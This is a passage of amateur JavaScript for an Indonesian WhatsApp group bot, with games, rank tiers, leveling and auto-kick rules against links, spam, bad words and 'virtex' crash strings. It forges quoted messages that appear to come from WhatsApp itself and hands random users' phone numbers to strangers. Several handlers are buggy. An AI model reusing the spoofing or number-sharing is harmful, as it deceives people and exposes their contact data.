            const slot8 = ['🍋','🍐','🍓','🍇','🍒']   
            const slot9 = ['🍋','🍐','🍓','🍇','🍒']
            const notc = ['😊','😃','??','🙂','😶','😣','🙁','😞','😬']
            const oxo1 = ['X : X : O','O : X : O','X : O : O','O : X : X','O : X : O','X : O : O','X : X : O','X : X : X','O : O : O']
            const oxo2 = ['X : X : O','O : X : O','X : O : O','O : X : X','O : X : O','X : O : O','X : X : O','X : X : X','O : O : O']  
            const oxo3 = ['X : X : O','O : X : O','X : O : O','O : X : X','O : X : O','X : O : O','X : X : O','X : X : X','O : O : O']
            const fernazer1 = ['1','2','3','4','5','6','7','8','9']
            const fernazer2 = ['1','2','3','4','5','6','7','8','9']
            const fernazer3 = fernazer1[Math.floor(Math.random() * (fernazer1.length))]
            const fernazer4 = fernazer2[Math.floor(Math.random() * (fernazer2.length))] 
            const oxo11 = oxo1[Math.floor(Math.random() * (oxo1.length))]
            const notc1 = notc[Math.floor(Math.random() * (notc.length))]
            const oxo22 = oxo2[Math.floor(Math.random() * (oxo2.length))]
            const oxo33 = oxo3[Math.floor(Math.random() * (oxo3.length))]
            const buruh11 = buruh1[Math.floor(Math.random() * (buruh1.length))]
		    const buruh22 = buruh2[Math.floor(Math.random() * (buruh2.length))]
		    const buruh33 = buruh3[Math.floor(Math.random() * (buruh3.length))]
            const slot11 = slot1[Math.floor(Math.random() * (slot1.length))]
		    const slot22 = slot2[Math.floor(Math.random() * (slot2.length))]
		    const slot33 = slot3[Math.floor(Math.random() * (slot3.length))]
		    const slot44 = slot4[Math.floor(Math.random() * (slot4.length))]
			const slot55 = slot5[Math.floor(Math.random() * (slot5.length))]
			const slot66 = slot6[Math.floor(Math.random() * (slot6.length))]	
		    const slot77 = slot4[Math.floor(Math.random() * (slot7.length))]
		    const slot88 = slot5[Math.floor(Math.random() * (slot8.length))]
			const slot99 = slot6[Math.floor(Math.random() * (slot9.length))]
			const buruh44 = buruh4[Math.floor(Math.random() * (buruh4.length))]
				                       
            
		//role level
        const levelRole = getLevelingLevel(sender)
        var role = 'Newbie ㋡'
        if (levelRole <= 5) {
            role = 'Newbie ㋡'
        } else if (levelRole <= 10) {
            role = 'Beginner Grade 1 ⚊¹'
        } else if (levelRole <= 15) {
            role = 'Beginner Grade 2 ⚊²'
        } else if (levelRole <= 20) {
            role = 'Beginner Grade 3 ⚊³'
        } else if (levelRole <= 25) {
            role = 'Beginner Grade 4 ⚊⁴'
        } else if (levelRole <= 30) {
            role = 'Private Grade 1 ⚌¹'
        } else if (levelRole <= 35) {
            role = 'Private Grade 2 ⚌²'
        } else if (levelRole <= 40) {
            role = 'Private Grade 3 ⚌³'
        } else if (levelRole <= 45) {
            role = 'Private Grade 4 ⚌⁴'
        } else if (levelRole <= 50) {
            role = 'Private Grade 5 ⚌⁵'
        } else if (levelRole <= 55) {
            role = 'Corporal Grade 1 ☰¹'
        } else if (levelRole <= 60) {
            role = 'Corporal Grade 2 ☰²'
        } else if (levelRole <= 65) {
            role = 'Corporal Grade 3 ☰³'
        } else if (levelRole <= 70) {
            role = 'Corporal Grade 4 ☰⁴'
        } else if (levelRole <= 75) {
            role = 'Corporal Grade 5 ☰⁵'
        } else if (levelRole <= 80) {
            role = 'Sergeant Grade 1 ≣¹'
        } else if (levelRole <= 85) {
            role = 'Sergeant Grade 2 ≣²'
        } else if (levelRole <= 95) {
            role = 'Sergeant Grade 3 ≣³'
        } else if (levelRole <= 100) {
            role = 'Sergeant Grade 4 ≣⁴'
        } else if (levelRole <= 105) {
            role = 'Sergeant Grade 5 ≣⁵'
        } else if (levelRole <= 110) {
            role = 'Staff Grade 1 ﹀¹'
        } else if (levelRole <= 115) {
            role = 'Staff Grade 2 ﹀²'
        } else if (levelRole <= 120) {
            role = 'Staff Grade 3 ﹀³'
        } else if (levelRole <= 125) {
            role = 'Staff Grade 4 ﹀⁴'
        } else if (levelRole <= 130) {
            role = 'Staff Grade 5 ﹀⁵'
        } else if (levelRole <= 135) {
            role = 'Sergeant Grade 1 ︾¹'
        } else if (levelRole <= 140) {
            role = 'Sergeant Grade 2 ︾²'
        } else if (levelRole <= 145) {
            role = 'Sergeant Grade 3 ︾³'
        } else if (levelRole <= 150) {
            role = 'Sergeant Grade 4 ︾⁴'
        } else if (levelRole <= 155) {
            role = 'Sergeant Grade 5 ︾⁵'
        } else if (levelRole <= 160) {
            role = '2nd Lt. Grade 1 ♢¹ '
        } else if (levelRole <= 165) {
            role = '2nd Lt. Grade 2 ♢²'
        } else if (levelRole <= 170) {
            role = '2nd Lt. Grade 3 ♢³'
        } else if (levelRole <= 175) {
            role = '2nd Lt. Grade 4 ♢⁴'
        } else if (levelRole <= 180) {
            role = '2nd Lt. Grade 5 ♢⁵'
        } else if (levelRole <= 185) {
            role = '1st Lt. Grade 1 ♢♢¹'
        } else if (levelRole <= 190) {
            role = '1st Lt. Grade 2 ♢♢²'
        } else if (levelRole <= 195) {
            role = '1st Lt. Grade 3 ♢♢³'
        } else if (levelRole <= 200) {
            role = '1st Lt. Grade 4 ♢♢⁴'
        } else if (levelRole <= 205) {
            role = '1st Lt. Grade 5 ♢♢⁵'
        } else if (levelRole <= 210) {
            role = 'Major Grade 1 ✷¹'
        } else if (levelRole <= 215) {
            role = 'Major Grade 2 ✷²'
        } else if (levelRole <= 220) {
            role = 'Major Grade 3 ✷³'
        } else if (levelRole <= 225) {
            role = 'Major Grade 4 ✷⁴'
        } else if (levelRole <= 230) {
            role = 'Major Grade 5 ✷⁵'
        } else if (levelRole <= 235) {
            role = 'Colonel Grade 1 ✷✷¹'
        } else if (levelRole <= 240) {
            role = 'Colonel Grade 2 ✷✷²'
        } else if (levelRole <= 245) {
            role = 'Colonel Grade 3 ✷✷³'
        } else if (levelRole <= 250) {
            role = 'Colonel Grade 4 ✷✷⁴'
        } else if (levelRole <= 255) {
            role = 'Colonel Grade 5 ✷✷⁵'
        } else if (levelRole <= 260) {
            role = 'Brigadier Early ✰'
        } else if (levelRole <= 265) {
            role = 'Brigadier Silver ✩'
        } else if (levelRole <= 270) {
            role = 'Brigadier gold ✯'
        } else if (levelRole <= 275) {
            role = 'Brigadier Platinum ✬'
        } else if (levelRole <= 280) {
            role = 'Brigadier Diamond ✪'
        } else if (levelRole <= 285) {
            role = 'Major General Early ✰'
        } else if (levelRole <= 290) {
            role = 'Major General Silver ✩'
        } else if (levelRole <= 295) {
            role = 'Major General gold ✯'
        } else if (levelRole <= 300) {
            role = 'Major General Platinum ✬'
        } else if (levelRole <= 305) {
            role = 'Major General Diamond ✪'
        } else if (levelRole <= 310) {
            role = 'Lt. General Early ✰'
        } else if (levelRole <= 315) {
            role = 'Lt. General Silver ✩'
        } else if (levelRole <= 320) {
            role = 'Lt. General gold ✯'
        } else if (levelRole <= 325) {
            role = 'Lt. General Platinum ✬'
        } else if (levelRole <= 330) {
            role = 'Lt. General Diamond ✪'
        } else if (levelRole <= 335) {
            role = 'General Early ✰'
        } else if (levelRole <= 340) {
            role = 'General Silver ✩'
        } else if (levelRole <= 345) {
            role = 'General gold ✯'
        } else if (levelRole <= 350) {
            role = 'General Platinum ✬'
        } else if (levelRole <= 355) {
            role = 'General Diamond ✪'
        } else if (levelRole <= 360) {
            role = 'Commander Early ★'
        } else if (levelRole <= 365) {
            role = 'Commander Intermediate ⍣'
        } else if (levelRole <= 370) {
            role = 'Commander Elite ≛'
        } else if (levelRole <= 375) {
            role = 'The Commander Hero ⍟'
        } else if (levelRole <= 380) {
            role = 'The Commander Elite Hero 𒐕'
        } else if (levelRole <= 385) {
            role = 'The Commander Elite Hero 𒐖'
        } else if (levelRole <= 390) {
            role = 'The Commander Elite Very Lite Hero 𒐗'
        } else if (levelRole <= 395) {
            role = 'The Commander Elite Very Hard Hero 𒐘'
        } else if (levelRole <= 400) {
            role = 'The Commander Elite Very Pro Hero 𒐙'
        } else if (levelRole <= 405) {
            role = 'The Commander Elite Very Strong Hero 𒐚'
        } else if (levelRole <= 410) {
            role = 'The Commander Elite Super Strong Hero 𒐛'
        } else if (levelRole <= 415) {
            role = 'The Commander Elite Super Strong Shadow Hero 𒐜'
        } else if (levelRole <= 420) {
            role = 'The Commander Elite Super Strong Shadow Hero 𒐝'
        } else if (levelRole <= 425) {
            role = 'The Commander Elite Super Strong Shadow Hero 𒐝'
        } else if (levelRole <= 430) {
            role = 'The Commander Legends Shadow Hero 忍'
        } else if (levelRole <= 435) {
            role = 'The Commander Legends Shadow Hero 忍'
        } else if (levelRole <= 440) {
            role = 'The Commander Legends Shadow Hero 忍'
        } else if (levelRole <= 450) {
            role = 'The Commander Legends Shadow Hero 忍'
        } else if (levelRole <= 460) {
            role = 'The Commander Legends Shadow Hero 忍'
        } else if (levelRole <= 470) {
            role = 'The Commander Legends Shadow Hero 忍'
        } else if (levelRole <= 480) {
            role = 'The Commander Legends Shadow Hero 忍'
        } else if (levelRole <= 490) {
            role = 'The Commander Legends Shadow Hero 忍'
        } else if (levelRole <= 500) {
            role = 'The Commander Legends Shadow Hero 忍'
            
      
           var prema = 'Free'
			if (!isAdmin) {
				prema = 'Adminban'
			}
			if (!isPremium) {
				prema = 'Premium'
			} 
			if (!isOwner) {
				prema = 'Owner'
			}
	}
	
	const freply3 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "liveLocationMessage":{"caption":`${ucapanWaktu} ${pushname}\n⎇ ${command}`,"jpegThumbnail":fs.readFileSync('./lib/logo.jpeg')
}}}
const freply2 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${ucapanWaktu} ${pushname}\n⎇ ${command}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail":fs.readFileSync('./lib/logo.jpeg')
}}}
const vreply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16505434800@s.whatsapp.net' } : {}) }, message: { "productMessage":{"product": {"productImage": {"mimetype":'image/jpeg',"jpegThumbnail":fs.readFileSync('./lib/logo.jpeg')}, "title": `${ucapanWaktu} ${pushname}`, "productImageCount": 1 }, "businessOwnerJid": `0@s.whatsapp.net` }}}
        const fakestatus = (teks) => {
            client.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "locationMessage": {
                            //"mimetype": "image/jpeg",
                            "name": `${ucapanWaktu} ${pushname}`,
                            "jpegThumbnail": fs.readFileSync('./lib/logo.jpeg')
                        }
                    }
                }
            })
        } 
        const fstick = {
key: {
		participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
					stickerMessage: {
			            url: "https://mmg.whatsapp.net/d/f/AsdWLvhs6HzTVXnUPeKx0HwaOu2fMULBOoWvcwSq7UFZ.enc", 
			            fileSha256: "rJo+aytbZuO3eBdqZv2LM0tNekFkS4xOJ32oWPuDANw=", 
                        fileEncSha256: "IuQDHy80VnTps8Z4SOVp29R7mM5MTZl+yMxbyjCAOPk=",
                        mediaKey: "o8nUNtr7Rt3xorRBkaoUXIG02FXYmpcfODamOO9LU/g=",
						mimetype: "image/webp",
						 height: 64,
						width: 64,
						directPath: "/v/t62.15575-24/13168186_543387126706005_212227891975731600_n.enc?ccb=11-4&oh=681a42dace0258a67544f4df45524b24&oe=60F422D8",
fileLength: "20236",
mediaKeyTimestamp: "1624176146"
					}
				}
			}
        const faketroli = {

key: {

fromMe: false,

participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {})

},

message: { 

orderMessage: {

itemCount: 1,

status: 200, 

surface: 200,

message: `${ucapanWaktu} ${pushname}\n⎇ ${command}`,

orderTitle: 'Ntah', 

thumbnail: fs.readFileSync('./lib/logo.jpeg'),

sellerJid: '0@s.whatsapp.net'

}

}

}
const fgclink = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6288213840883-1616169743@g.us",
			"inviteCode": "DqHhY6U9XHNKo3RpJmiYy2",
			"groupName": `${ucapanWaktu} ${pushname}\n⎇ ${command}`, 
"caption": `${ucapanWaktu} ${pushname}\n⎇ ${command}`, 
'jpegThumbnail': fs.readFileSync('./lib/logo.jpeg')
		}
	}
}

        const fakethumb = (teks, yes) => {
            client.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./lib/logo.jpeg'),quoted:mek,caption:yes})
        }
        const fakegroup = (teks) => {
            client.sendMessage(from, teks, text, {
                quoted: {
                    "key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6288213840883-1616169743@g.us",
			"inviteCode": "DqHhY6U9XHNKo3RpJmiYy2",
			"groupName": `${ucapanWaktu} ${pushname}`, 
"caption": `${ucapanWaktu} ${pushname}`, 
'jpegThumbnail': fs.readFileSync('./lib/logo.jpeg')
		}
	}
}
})
        } 
        const fdocs = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    documentMessage: {
                    title: '${ucapanWaktu} ${pushname}', 
                    jpegThumbnail: fs.readFileSync('./lib/logo.jpeg')
                          }
                        }
                      }
        const fakevn = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"audioMessage": {
                 "mimetype":"audio/ogg; codecs=opus",
                 "seconds": "999",
                 "ptt": "true"
                        }
	                  } 
                     } 
        const fvideo = {
	 key: { 
	      participant: '6285284001309@s.whatsapp.net'
	       },
	 message: { 
                 "videoMessage": { 
                 "title":"hallo bang",
                 "h": `Hmm`, 
                 'seconds': '99999', 
                 'caption': '${ucapanWaktu} ${pushname}',
                 'jpegThumbnail': fs.readFileSync('./lib/logo.jpeg')
                        }
                       }
	                  }
			
			
	        //function leveling
            if (isGroup && isRegistered && isLevelingOn) {
            const currentLevel = getLevelingLevel(sender)
            const checkId = getLevelingId(sender)
            try {
                if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
                const amountXp = Math.floor(Math.random() * 10) + 100
                const requiredXp = 5000 * (Math.pow(2, currentLevel) - 1)
                const getLevel = getLevelingLevel(sender)
                addLevelingXp(sender, amountXp)
                if (requiredXp <= getLevelingXp(sender)) {
                    addLevelingLevel(sender, 1)
                    bayarLimit(sender, 3)
                    await reply(ind.levelup(pushname, sender, getLevelingXp,  getLevel, getLevelingLevel, role))
                }
            } catch (err) {
                console.error(err)
            }
        }
          //function check limit
          const checkLimit = (sender) => {
          	let found = false
                    for (let lmt of _limit) {
                        if (lmt.id === sender) {
                            let limitCounts = limitawal - lmt.limit
                            if (limitCounts <= 0) return client.sendMessage(from,`Limit request anda sudah habis\n\n_Note : limit bisa di dapatkan dengan cara ${prefix}buylimit dan dengan naik level_`, text,{ quoted: mek})
                            client.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                            found = true
                        }
                    }
                    if (found === false) {
                        let obj = { id: sender, limit: 0 }
                        _limit.push(obj)
                        fs.writeFileSync('./database/pengguna/limit.json', JSON.stringify(_limit))
                        client.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                    }
				}
				
			//funtion limited
           const isLimit = (sender) =>{ 
		      let position = false
              for (let i of _limit) {
              if (i.id === sender) {
              	let limits = i.limit
              if (limits >= limitawal ) {
              	  position = true
                    client.sendMessage(from, ind.limitend(pushname), text, {quoted: mek})
                    return true
              } else {
              	_limit
                  position = true
                  return false
               }
             }
           }
           if (position === false) {
           	const obj = { id: sender, limit: 0 }
                _limit.push(obj)
                fs.writeFileSync('./database/pengguna/limit.json',JSON.stringify(_limit))
           return false
       }
     }

        
            if (isGroup) {
				try {
					const getmemex = groupMembers.length
					    if (getmemex <= memberlimit) {
					    }
		       } catch (err) { console.error(err)  }
        }
      
            //function balance
            if (isRegistered ) {
            const checkATM = checkATMuser(sender)
            try {
                if (checkATM === undefined) addATM(sender)
                const uangsaku = Math.floor(Math.random() * 10) + 90
                addKoinUser(sender, uangsaku)
            } catch (err) {
                console.error(err)
            }
        }
        
        
/////***ANTI LINK NYA GUE BUAT SENDIRI KLO BUG BILANG GUE***\\\\\
// buatan Fernazer Ori
        if (messagesC.includes("://youtube.com/")){
					if (!isGroup) return
					if (!isAntiYt) return
					if (isGroupAdmins) return reply('karena kamu adalah admin group, Reneasy tidak akan kick kamu')
					client.updatePresence(from, Presence.composing)
					if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
					var kicyt = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*「 Link YouTube Channel Terdeteksi 」 wa.me/${sender.split("@")[0]} Maaf Anda Di Kick.*`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		}, 1000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
reply("*「 BACA PERATURAN GC 」Selamat Tinggal Sobat, Lain kali Kalau Ada Masuk Grup Di Baca Dulu Peraturannya Ya Kak...*\n\n*Promosi wajib Izin Admin.*")
		}, 0)
	}

/////***ANTI LINK NYA GUE BUAT SENDIRI KLO BUG BILANG GUE***\\\\\
// buatan Fernazer Ori
        if (messagesC.includes("://youtube.com/")){
					if (!isGroup) return
					if (!isAntiYt) return
					if (isGroupAdmins) return reply('karena kamu adalah admin group, Reneasy tidak akan kick kamu')
					client.updatePresence(from, Presence.composing)
					if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
					var kicyt = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*「 Link YouTube Video Terdeteksi 」 wa.me/${sender.split("@")[0]} Maaf Anda Di Kick.*`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		}, 1000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
reply("*「 BACA PERATURAN GC 」Selamat Tinggal Sobat, Lain kali Kalau Ada Masuk Grup Di Baca Dulu Peraturannya Ya Kak...*\n\n*Promosi Wajib izin Admin.*")
		}, 0)
	}
	
/////***ANTI LINK NYA GUE BUAT SENDIRI KLO BUG BILANG GUE***\\\\\
// buatan Fernazer Ori
        if (budy.includes("://t.me/")){
		if (!isGroup) return
		if (!isAntiLinkTelegram) return
		if (isGroupAdmins) return reply('*Admin Terdeteksi, Bot Tidak Akan Mengeluarkan Admin Grup, Karena Admin Grup Bebas Mengirimkan Link Telegram*')
		client.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*「 Link Telegram Terdeteksi 」 wa.me/${sender.split("@")[0]} Maaf Anda Di Kick.*`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((err)=>{reply(`*ERR:* ${e}`)})
		}, 1000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
reply("*「 BACA PERATURAN GC 」Selamat Tinggal Sobat, Lain kali Kalau Ada Masuk Grup Di Baca Dulu Peraturannya Ya Kak...*\n\n*Promosi Link Wajib Izin Admin.*")
		}, 0)
	}
	
	
// ANTILINK ALL https://.com      
        if (messagesC.includes("https://")){
		if (!isGroup) return
		if (!isAntilink) return
		if (isGroupAdmins) return reply('karena kamu admin group, bot tidak akan kick kamu')
		client.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`Link Group Terdeteksi maaf ${sender.split("@")[0]} anda akan di kick dari group 5detik lagi`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 3000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("1detik")
		}, 2000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("2detik")
		}, 1000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("3detik")
		}, 0)
	}
		  
		    if (messagesC.includes("://kuotainternet.online/")){
		if (!isGroup) return
		if (!isAntilink) return
		if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
		client.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`Link Group Terdeteksi maaf ${sender.split("@")[0]} anda akan di kick dari group 5detik lagi`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 3000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("1detik")
		}, 2000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("2detik")
		}, 1000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("3detik")
		}, 0)
	}

		   
		    if (messagesC.includes("://internet4g.live/")){
		if (!isGroup) return
		if (!isAntilink) return
		if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
		client.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`Link Group Terdeteksi maaf ${sender.split("@")[0]} anda akan di kick dari group 5detik lagi`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 3000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("1detik")
		}, 2000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("2detik")
		}, 1000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("3detik")
		}, 0)
	}
	
// ANTIVIRTEX BUATAN FERNAZER
	            if (messagesC.match("ผิดุท้่เึางืผิดุท้่เึาง")){
		        if (!isGroup) return
		        if (!isAntiVirtex) return
		        if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
		        client.updatePresence(from, Presence.composing)
		        var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		        reply(`Virtex terdeteksi ${sender.split("@")[0]} anda akan di kick dari group 3 detik lagi`)
		        setTimeout( () => {
		        client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		        }, 3000)
		        setTimeout( () => {
		        client.updatePresence(from, Presence.composing)
		        reply("1detik")
		        }, 2000)
		        setTimeout( () => {
			    client.updatePresence(from, Presence.composing)
			    reply("2detik")
		        }, 1000)
		        setTimeout( () => {
			    client.updatePresence(from, Presence.composing)
			    reply("3detik")
		        }, 0)
	            }
	            if (messagesC.match("৭৭৭৭৭৭৭৭")){
		        if (!isGroup) return
		        if (!isAntiVirtex) return
		        if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
		        client.updatePresence(from, Presence.composing)
		        var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		        reply(`Virtex terdeteksi ${sender.split("@")[0]} anda akan di kick dari group 3 detik lagi`)
		        setTimeout( () => {
		        client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		        }, 3000)
		        setTimeout( () => {
		        client.updatePresence(from, Presence.composing)
		        reply("1detik")
		        }, 2000)
		        setTimeout( () => {
			    client.updatePresence(from, Presence.composing)
			    reply("2detik")
		        }, 1000)
		        setTimeout( () => {
			    client.updatePresence(from, Presence.composing)
			    reply("3detik")
		        }, 0)
	            }
	            if (messagesC.match("๒๒๒๒๒๒๒๒")){
		        if (!isGroup) return
		        if (!isAntiVirtex) return
		        if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
		        client.updatePresence(from, Presence.composing)
		        var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		        reply(`Virtex terdeteksi ${sender.split("@")[0]} anda akan di kick dari group 3 detik lagi`)
		        setTimeout( () => {
		        client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		        }, 3000)
		        setTimeout( () => {
		        client.updatePresence(from, Presence.composing)
		        reply("1detik")
		        }, 2000)
		        setTimeout( () => {
			    client.updatePresence(from, Presence.composing)
			    reply("2detik")
		        }, 1000)
		        setTimeout( () => {
			    client.updatePresence(from, Presence.composing)
			    reply("3detik")
		        }, 0)
	            }
	            if (messagesC.match("๑๑๑๑๑๑๑๑")){
		        if (!isGroup) return
		        if (!isAntiVirtex) return
		        if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
		        client.updatePresence(from, Presence.composing)
		        var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		        reply(`Virtex terdeteksi ${sender.split("@")[0]} anda akan di kick dari group 3 detik lagi`)
		        setTimeout( () => {
		        client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		        }, 3000)
		        setTimeout( () => {
		        client.updatePresence(from, Presence.composing)
		        reply("1detik")
		        }, 2000)
		        setTimeout( () => {
			    client.updatePresence(from, Presence.composing)
			    reply("2detik")
		        }, 1000)
		        setTimeout( () => {
			    client.updatePresence(from, Presence.composing)
			    reply("3detik")
		        }, 0)
	            }
	// ANTI SPAM
        if (isGroup && isBotGroupAdmins && !isGroupAdmins && !isAntiSpam) {
	client.updatePresence(from, Presence.composing)
            if (budy.length > 5000) {
                var kiics = `${sender.split("@")[0]}@s.whatsapp.net`
                reply(`Terdeteksi Spam Chatt Oleh ${sender.split("@")[0]} kalo ngechat jangan panjang" textnya!`)
                setTimeout( () => {
                    client.blockUser(sender, "add")
                }, 0)
            }
        }
// BADWORD COK
        if (bad.includes(messagesC)) {
		if (!isGroup) return
		if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`_「 ʙᴀᴅᴡᴏʀᴅ ᴅᴇᴛᴇᴄᴛᴇᴅ 」_\nᴍᴀᴀғ ${pushname} ᴀɴᴅᴀ ʙᴇʀʙɪᴄᴀʀᴀ ᴋᴏᴛᴏʀ!, ᴀɴᴅᴀ ꜱᴇɢᴇʀᴀ ᴅɪᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ${groupMetadata.subject}`)
		setTimeout( () => {
		reply(`MAKANYA JANGAN TOXIC`)
		}, 100)
		setTimeout( () => {
		client.groupRemove(from, [Kick]).catch((e) => {reply(`ERROR: ${e}`)}) 
		}, 10)
		setTimeout( () => {
		reply(`_ Wkwk Mampus`)
		}, 0)
		}
		 

             //kolor
			colors = ['red','white','black','blue','yellow','green']
			
			//detector media
			const isMedia = (type === 'imageMessage' || type === 'videoMessage')
			const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
			const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
			const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
			
			//private chat message
			if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mSukses\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
			if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31msukses\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
			
			//group message
			if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mSukses\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
			if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31msukses\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
			
			switch(command) {	
			
			
			
  									
case 'd':
case 'del':
case 'delete':
if (!isRegistered) return reply(ind.noregis())
client.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
break
		case 'mutual':
                 if (!isRegistered) return reply( ind.noregis())
				if (isGroup) return  reply( 'Command ini tidak bisa digunakan di dalam grup!')
				anug = getRegisteredRandomId(_registered).replace('@s.whatsapp.net','')
				await reply('Find for a partner...')
				await reply(`wa.me/${anug}`)
				await reply( `Partner found: 🙉\n*${prefix}next* — find a new partner`)
				await limitAdd(sender)
				break
		case 'next':
				if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply('Maaf, Rene telah membanned mu!\nHarap meningkatkan premium untuk terbebas banned selama anda premium!')
				if (isGroup) return  reply( 'Command ini tidak bisa digunakan di dalam grup!')
				anug = getRegisteredRandomId(_registered).replace('@s.whatsapp.net','')
				await reply('Looking for a partner...')
				await reply(`wa.me/${anug}`)
				await reply( `Partner found: 🙉\n*${prefix}next* — find a new partner`)
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
			break
		case 'transfer':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (!q.includes('|')) return  reply(ind.wrongf())
                		const tujuan = q.substring(0, q.indexOf('|') - 1)
                		const jumblah = q.substring(q.lastIndexOf('|') + 1)
                		if(isNaN(jumblah)) return await reply('jumlah harus berupa angka!!')
                		if (jumblah < 5000 ) return reply(`minimal transfer 5000`)
